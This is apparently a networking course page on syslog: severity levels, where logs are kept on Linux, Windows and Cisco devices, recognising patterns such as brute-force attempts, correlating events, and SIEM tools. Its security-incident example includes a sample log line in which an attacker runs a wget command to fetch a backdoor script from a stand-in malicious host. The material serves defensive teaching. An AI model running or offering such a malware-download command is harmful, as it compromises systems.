Logging protocol

Syslog — Introduction

Syslog = Standard protocol logging system/network events. Port UDP 514 (default). Centralized logging multiple devices.

// Syslog components

  • Syslog client : Device generating logs (router, switch, server, firewall)
  • Syslog server : Centralized log collection (stores, analyzes logs)
  • Syslog message : Log entry (timestamp, severity, facility, message)

// Syslog message format

Structure :
.:

Example :
Mar 01 14:32:15 Router-Core %SYS-5-CONFIG_I: Configured from console by admin

Breakdown :
Timestamp : Mar 01 14:32:15
Hostname : Router-Core
Facility : %SYS (system)
Severity : 5 (Notification)
Message : Configured from console by admin

// Syslog severity levels

LevelNameDescriptionExample
0 Emergency System unusable Complete system failure
1 Alert Immediate action needed Temperature critical, shutdown imminent
2 Critical Critical condition Hardware failure detected
3 Error Error condition Interface down, routing protocol failure
4 Warning Warning condition High CPU usage, memory low
5 Notice Normal but significant Interface up, configuration change
6 Informational Info message User login, DHCP lease assigned
7 Debug Debug message Detailed troubleshooting info
💡
Remember severity : Lower number = More serious 0 = Emergency (worst)
7 = Debug (least serious)
Production : Monitor levels 0-4 (Emergency through Warning).
Debug (7) : Troubleshooting only (generates massive logs).
Log analysis

Lecture de logs — Reading & interpreting

// Linux syslog locations

Common log files :

/var/log/syslog → General system messages (Debian/Ubuntu)
/var/log/messages → General messages (RHEL/CentOS)
/var/log/auth.log → Authentication (login attempts)
/var/log/kern.log → Kernel messages
/var/log/dmesg → Boot messages

View logs :
$ tail -f /var/log/syslog (real-time monitoring)
$ grep "error" /var/log/syslog (search errors)
$ less /var/log/syslog (page through)

// Windows Event Viewer

Event Viewer → Windows Logs :

Application : Application events (crashes, errors)
Security : Login attempts, privilege changes
System : System services, drivers, hardware
Setup : Windows updates, installations

Event levels :
Error : Serious problem (service crash)
Warning : Not critical but noteworthy
Information : Normal operation events

// Cisco router/switch logs

View logs :
Router# show logging

Example output :
Mar 01 14:25:12: %LINEPROTO-5-UPDOWN: Line protocol on Interface Gi0/1, changed state to up
Mar 01 14:30:45: %SYS-5-CONFIG_I: Configured from console by admin on vty0
Mar 01 14:32:18: %LINK-3-UPDOWN: Interface Gi0/2, changed state to down

→ Interface Gi0/2 down (severity 3 = Error) ❌

// Log entry interpretation example

Entry :
Feb 28 23:58:03 Firewall-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.45 DST=192.168.1.50 PROTO=TCP SPT=54321 DPT=22

Analysis :
Timestamp : Feb 28 23:58:03
Host : Firewall-01
Severity : kernel (critical)
Event : UFW BLOCK (firewall blocked connection)
Details :
  → Source IP : 203.0.113.45
  → Dest IP : 192.168.1.50
  → Protocol : TCP
  → Source port : 54321
  → Dest port : 22 (SSH)

Interpretation :
→ External IP (203.0.113.45) attempted SSH connection to 192.168.1.50
→ Firewall blocked (potential attack OR legitimate admin blocked)
Pattern recognition

Identification de patterns — Common log patterns

// Pattern #1 : Repeated authentication failures

Feb 28 10:15:23 Server-01 sshd: Failed password for admin from 203.0.113.45
Feb 28 10:15:25 Server-01 sshd: Failed password for admin from 203.0.113.45
Feb 28 10:15:27 Server-01 sshd: Failed password for admin from 203.0.113.45
Feb 28 10:15:29 Server-01 sshd: Failed password for admin from 203.0.113.45
...(100+ attempts)

Pattern : Multiple failed logins, same IP, rapid succession
Indication : Brute force attack ❌
Action : Block IP (firewall), enable fail2ban, investigate

// Pattern #2 : Interface flapping

Mar 01 08:10:15: %LINK-3-UPDOWN: Interface Gi0/5, changed state to down
Mar 01 08:10:18: %LINK-3-UPDOWN: Interface Gi0/5, changed state to up
Mar 01 08:10:22: %LINK-3-UPDOWN: Interface Gi0/5, changed state to down
Mar 01 08:10:25: %LINK-3-UPDOWN: Interface Gi0/5, changed state to up
...(repeating)

Pattern : Interface up/down cycling
Indication : Bad cable, loose connection, hardware fault
Action : Replace cable, check connector, test port

// Pattern #3 : Memory/CPU warnings

Mar 01 12:30:00: %SYS-4-P2_WARN: System memory usage 95%
Mar 01 12:30:05: %SYS-4-P2_WARN: CPU utilization 98% for 5 seconds
Mar 01 12:30:10: %SYS-4-P2_WARN: Process "ospf" consuming 85% CPU

Pattern : Resource exhaustion warnings
Indication : Overload, possible attack (DoS), runaway process
Action : Identify cause (show processes cpu), restart process, investigate traffic

// Pattern #4 : Configuration changes

Mar 01 14:35:20: %SYS-5-CONFIG_I: Configured from console by admin on vty0 (192.168.1.150)

Pattern : Config change timestamp
Indication : Admin activity (correlation with issues)
Action : If issues started after config change → Review changes, rollback if needed

// Pattern #5 : DHCP exhaustion

Mar 01 09:00:00: DHCP: Address pool exhausted for subnet 192.168.1.0/24
Mar 01 09:00:05: DHCP: Client aa:bb:cc:dd:ee:ff request failed - no addresses available
...(multiple denials)

Pattern : DHCP pool full, clients denied
Indication : Pool too small OR rogue DHCP attack
Action : Expand pool, check for rogue clients, investigate leases
Event correlation

Corrélation avec événements réseau — Connecting the dots

// Correlation example #1 : Network outage

User report : "No Internet access since 10:15 AM"

Timeline from logs :

10:14:32 : Router-Core %SYS-5-CONFIG_I: Configured from console by admin
→ Admin made config change

10:14:58 : Router-Core %LINEPROTO-5-UPDOWN: Line protocol on Gi0/0 (WAN), changed state to down
→ WAN interface went down

10:15:03 : Router-Core %LINK-3-UPDOWN: Interface Gi0/0, changed state to down
→ Link physically down

Correlation :
→ Admin config change (10:14:32)
→ Immediately followed by WAN down (10:14:58)
→ Conclusion : Config change caused outage (misconfiguration)
→ Action : Review config change, rollback

// Correlation example #2 : Performance degradation

User report : "Network very slow starting 2:00 PM"

Logs :

14:00:15 : Switch-01 %SPANTREE-2-LOOPBACK_DETECTED: Loopback detected on Gi0/10
→ Switching loop detected

14:00:18 : Switch-01 %PM-4-ERR_DISABLE: bpduguard error on Gi0/10, port disabled
→ Port shut down (BPDU Guard)

14:00:20 : Router-Core %SYS-4-P2_WARN: CPU utilization 95%
→ Router CPU spiked

Correlation :
→ Switching loop created (user plugged both ends cable? rogue switch?)
→ Broadcast storm overwhelmed router CPU
→ Network slow until loop broken (port disabled)
→ Action : Investigate Gi0/10 (what device connected?)

// Correlation example #3 : Security incident

Multiple log sources :

Firewall logs :
03:15:00 : [BLOCK] SRC=45.67.89.100 DST=192.168.1.50 DPT=22 (100+ attempts)
→ External IP scanning port 22 (SSH)

Server auth.log :
03:15:23 : Failed password for root from 45.67.89.100
03:15:25 : Failed password for root from 45.67.89.100
...(50+ failures)
03:17:45 : Accepted password for root from 45.67.89.100
→ Attacker successfully logged in ❌

03:18:00 : Server syslog: User root executed: wget http://malware.com/backdoor.sh
→ Attacker downloading malware

Correlation :
→ Port scan → Brute force → Successful breach → Malware installation
→ Action : Isolate server, block IP, incident response, forensics
⚠️
Time synchronization critical for correlation NTP (Network Time Protocol) : All devices synchronized time.
Without sync : Logs different devices show different times → Correlation impossible.
Always configure NTP servers (accurate timestamps essential troubleshooting).
Analysis tools

Outils d'analyse logs — Log management

// Command-line tools

grep : Search pattern
$ grep "error" /var/log/syslog
$ grep -i "failed" /var/log/auth.log (case-insensitive)
$ grep -A 5 "Interface down" /var/log/messages (show 5 lines after match)

tail : View end of file / real-time monitoring
$ tail -f /var/log/syslog (follow mode - live updates)
$ tail -n 100 /var/log/syslog (last 100 lines)

awk : Extract fields
$ awk '{print $1, $2, $3, $5}' /var/log/syslog (timestamp + hostname + severity)

sort/uniq : Count occurrences
$ grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c
→ Count failed logins per IP

// Centralized log management (SIEM)

  • Splunk : Commercial SIEM (powerful, expensive)
  • ELK Stack : Elasticsearch + Logstash + Kibana (open source)
  • Graylog : Open source log management
  • Syslog-ng : Advanced syslog server

// Benefits centralized logging

  • Single pane of glass : All devices one location
  • Correlation : Automatic correlation events across devices
  • Retention : Long-term storage (compliance, forensics)
  • Alerting : Real-time alerts critical events
  • Search : Fast search millions logs
  • Visualization : Dashboards, graphs, trends
Résumé

🔑 Ce que tu dois retenir absolument

→Syslog : Protocol logging UDP 514. Severity levels 0-7 (0=Emergency worst, 7=Debug least serious). Format: Timestamp Hostname Facility.Severity Message. Monitor 0-4 (Emergency-Warning) production
→Lecture logs : Linux /var/log/syslog, /var/log/messages, /var/log/auth.log. Windows Event Viewer (Application, Security, System). Cisco show logging. Commands: tail -f (real-time), grep (search), awk (parse)
→Patterns : Repeated auth failures (brute force), interface flapping (bad cable), memory/CPU warnings (overload/DoS), config changes (correlation outages), DHCP exhaustion (pool small/rogue). Recognize common patterns quickly
→Corrélation : Timeline logs multiple devices. NTP essential (synchronized timestamps). Example: Config change → Interface down → Outage (correlation proves cause). Security: Scan → Brute force → Breach (attack chain)
→Outils : Command-line (grep, tail -f, awk, sort | uniq -c). SIEM (Splunk, ELK Stack, Graylog) centralized management. Benefits: Correlation, retention, alerting, search, dashboards. Critical large networks
→Best practices : Enable logging all devices, configure syslog server (centralize), NTP sync (accurate time), monitor severity 0-4, review logs regularly (proactive), automate alerts critical events (SIEM)
